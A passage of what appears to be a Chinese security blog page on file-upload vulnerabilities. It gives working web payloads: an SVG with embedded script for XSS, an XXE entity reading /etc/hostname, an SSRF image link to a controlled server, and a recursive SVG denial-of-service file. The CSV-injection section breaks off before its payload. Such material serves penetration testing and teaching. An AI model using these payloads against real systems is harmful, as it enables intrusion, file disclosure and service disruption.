+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">$ tar -rf a.tar sub</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="14-允许上传html文件" class="heading-element"><span>1.4. 允许上传HTML文件</span>
+  <a href="#14-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0html%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>允许上传html或者XML都可以能导致xss，也能导致任意URL跳转，甚至还能导致SSRF（很难利用），因为核心还是js代码可控。</p>
+<p>html造成XSS就不多说了，懂得都懂</p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th>HTML文件后缀</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Common</td>
+          <td>htm		html	shtml</td>
+      </tr>
+      <tr>
+          <td>IIS</td>
+          <td>htm		hxt</td>
+      </tr>
+      <tr>
+          <td>Apache httpd</td>
+          <td>html.de	html.xxx</td>
+      </tr>
+      <tr>
+          <td>其他/少见</td>
+          <td>body	    manifest		appcache</td>
+      </tr>
+  </tbody>
+</table>
+<p>检查 MIME 类型是否存在可能的 XSS：</p>
+<ul>
+<li><a href="https://github.com/BlackFan/content-type-research"target="_blank" rel="external nofollow noopener noreferrer">content-type-research</a> 项目</li>
+</ul>
+<h2 id="15-允许上传xml格式文件并解析" class="heading-element"><span>1.5. 允许上传XML格式文件并解析</span>
+  <a href="#15-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0xml%e6%a0%bc%e5%bc%8f%e6%96%87%e4%bb%b6%e5%b9%b6%e8%a7%a3%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>如果允许上传XML格式文件，如<code>docx</code>、<code>xlsx</code>、<code>svg</code>等本质是xml的文件，且后端会对上传的文件进行解析，那么可能存在XSS、XXE等漏洞</p>
+<h3 id="xss" class="heading-element"><span>XSS</span>
+  <a href="#xss" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><table>
+  <thead>
+      <tr>
+          <th></th>
+          <th>XSS 后缀</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Common</td>
+          <td>xml	svg		xht		xsd		xsl		svgz  	xhtml</td>
+      </tr>
+      <tr>
+          <td>IIS</td>
+          <td>dtd	vml	xsf	mno	wsdl	xslt	disco	exe.config	dll.config</td>
+      </tr>
+      <tr>
+          <td>Apache httpd</td>
+          <td>rdf		mathml</td>
+      </tr>
+      <tr>
+          <td>其他/少见</td>
+          <td>vtt		mml</td>
+      </tr>
+  </tbody>
+</table>
+<p>主要说说svg文件如何造成xss</p>
+<p><strong>检查思路：</strong></p>
+<ol>
+<li>创建一个恶意的svg文件，输入如下内容：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span> <span class="na">baseProfile=</span><span class="s">&#34;full&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;polygon</span> <span class="na">id=</span><span class="s">&#34;triangle&#34;</span> <span class="na">points=</span><span class="s">&#34;0,0 0,50 50,0&#34;</span> <span class="na">fill=</span><span class="s">&#34;#009900&#34;</span> <span class="na">stroke=</span><span class="s">&#34;#004400&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;script</span> <span class="na">type=</span><span class="s">&#34;text/javascript&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      alert(document.domain);
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;/script&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传到文件中，并访问即可触发XSS。</p>
+<h3 id="xxe" class="heading-element"><span>XXE</span>
+  <a href="#xxe" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>XXE in XML</p>
+<p>以恶意svg为例，一般尝试OOB外带注入的方式来判断最快</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;128px&#34;</span> <span class="na">height=</span><span class="s">&#34;128px&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;text</span> <span class="na">font-size=</span><span class="s">&#34;16&#34;</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;16&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>恶意的XXE文档生成：<a href="https://github.com/whitel1st/docem.git"target="_blank" rel="external nofollow noopener noreferrer">docem</a></p>
+<p>XXE in OOXML/ODF</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.docx		.xlsx		.odt</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><a href="https://oxmlxxe.github.io/"target="_blank" rel="external nofollow noopener noreferrer">https://oxmlxxe.github.io/</a></li>
+<li><a href="https://www.4armed.com/blog/exploiting-xxe-with-excel/"target="_blank" rel="external nofollow noopener noreferrer">Exploiting XXE with Excel</a></li>
+</ul>
+<h3 id="ssrf" class="heading-element"><span>SSRF</span>
+  <a href="#ssrf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Tip:</p>
+<p>如果目标存在导出功能，如给svg导出为pdf这种功能，那么可能存在<strong>SSRF</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">xmlns:svg=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">width=</span><span class="s">&#34;200&#34;</span> <span class="na">height=</span><span class="s">&#34;200&#34;</span><span class="nt">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;image</span> <span class="na">height=</span><span class="s">&#34;30&#34;</span> <span class="na">width=</span><span class="s">&#34;30&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="na">xlink:href=</span><span class="s">&#34;https://controlledserver.com/pic.svg&#34;</span> <span class="nt">/&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可尝试使用其他协议更直观的查看，如<code>file://</code></p>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/223203"target="_blank" rel="external nofollow noopener noreferrer">SVG Server Side Request Forgery (SSRF)</a></li>
+<li><a href="https://github.com/allanlw/svg-cheatsheet"target="_blank" rel="external nofollow noopener noreferrer">SVG SSRF Cheatsheet</a></li>
+</ul>
+<h3 id="dos" class="heading-element"><span>DOS</span>
+  <a href="#dos" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>如果可以上传任意SVG文件，且可在网站的某些页面中进行展示，那么可以通过反复嵌套使用，直至浏览器或者电脑卡死。</p>
+<blockquote>
+<p>可以展示：不一定非得是<code>&lt;svg&gt;</code>标签的形式，也可以通过img等标签展示，形如：<code>&lt;img src=&quot;data:image/svg+xml;base64,&lt;svg base64&gt;&quot; alt=&quot;SVG Image&quot;&gt;</code></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">version=</span><span class="s">&#34;1.2&#34;</span> <span class="na">baseProfile=</span><span class="s">&#34;tiny&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">x=</span><span class="s">&#34;0px&#34;</span> <span class="na">y=</span><span class="s">&#34;0px&#34;</span> <span class="na">xml:space=</span><span class="s">&#34;preserve&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;path</span> <span class="na">id=</span><span class="s">&#34;a&#34;</span> <span class="na">d=</span><span class="s">&#34;M0,0&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;b&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#a&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;c&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#b&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;d&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#c&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;e&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#d&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;f&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#e&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;g&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#f&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;h&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#g&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;i&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#h&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;g</span> <span class="na">id=</span><span class="s">&#34;j&#34;</span><span class="nt">&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;use</span> <span class="na">xlink:href=</span><span class="s">&#34;#i&#34;</span><span class="nt">/&gt;&lt;/g&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>原理</strong>：</p>
+<p><code>xlink:href</code> 属性以 IRI（国际资源标识）方式定义了对某个资源的引用，该链接的具体含义需根据使用该链接的每个元素的上下文来决定。</p>
+<p><code>&lt;use&gt;</code> 元素从 SVG 文档中获取节点，然后将其复制到其他位置。</p>
+<p>上述代码通过递归嵌套，导致浏览器拒绝服务，网站页面崩溃。</p>
+<h2 id="16-允许上传csv" class="heading-element"><span>1.6. 允许上传CSV</span>
+  <a href="#16-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0csv" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>如果允许上传CSV文件，且上传的CSV文件的内容未经过处理过滤直接保存，那么可以尝试上传具有恶意命令执行payload的CSV文件，当其他用户下载该CSV文件时，可能会导致命令执行。</p>
+<p>CSV Payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
